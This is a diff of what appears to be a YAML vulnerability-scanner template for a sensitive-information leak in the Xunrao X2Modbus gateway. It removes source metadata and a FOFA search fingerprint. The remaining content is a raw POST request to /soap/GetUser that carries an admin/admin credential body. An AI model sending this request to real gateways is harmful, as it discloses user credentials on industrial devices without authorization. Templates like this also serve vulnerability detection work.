@@ -3,12 +3,8 @@ info:
   name: 迅饶科技 X2Modbus 网关 GetUser 敏感信息泄露
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gi3vux7hfu4m45i4'
+  description: ''
   tags: info-leak,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gi3vux7hfu4m45i4
-    fofa: server="SunFull-Webs"
 http:
 - raw:
   - 'POST /soap/GetUser HTTP/1.1
@@ -39,8 +35,6 @@ http:
 
 
     Content-Type: application/x-www-form-urlencoded
-
-
 
 
     <GetUser><User Name="admin" Password="admin"/></GetUser>
